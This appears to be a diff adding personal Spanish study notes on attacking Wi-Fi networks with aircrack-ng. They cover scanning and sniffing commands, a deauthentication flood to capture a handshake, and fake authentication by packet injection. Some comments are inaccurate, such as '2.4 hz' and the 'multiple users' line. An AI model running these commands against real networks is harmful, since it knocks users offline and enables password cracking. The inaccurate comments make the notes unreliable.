@@ -1,0 +1,27 @@
+Subnet, significa red interna todos los dispositivos conectados a nuestra wireless lan tendran ips parecidas cambiando el ultimo digito. 192.168.1.*
+
+#Con el siguiente comando escanearemos las redes de 2.4 hz
+airodump-ng --band abg wlan0
+
+#Asi lo usamos para olfatear una red en especifico, siempre ejecutarlo en algun directorio que creemos con el nombre de la red porque nos guarda varios archivos
+airodump-ng --bssid FF:FF:FF:FF:FF:FF --channel 5 --write test wlan0
+
+#Con este ataque nos hacemos pasar por un dispositivo y hacemos como que queremos desconectarnos para qe lo echen de la red y capturar su handshake.
+aireplay-ng --deauth 1000000 -a [bssid] -c [station] wlan0
+
+#Hacemos lo mismo pero a multiples usuarios en una red
+aireplay-ng --deauth 1000000 -a [bssid] -c [station] wlan0 &>/dev/null&
+
+#Para listar los trabajos
+jobs
+
+#Dejar de correrlos
+kill
+
+#Asi escaneamos por canal
+airodump-ng --bssid [bssid] --channel [canal] --write [nombredelared] wlan0
+
+#Para encontrar redes ocultas
+
+#Autenticacion falsa con inyeccion de paquetes
+aireplay-ng --fakeauth 0 -a [bssid] -h [macnuestro] wlan0
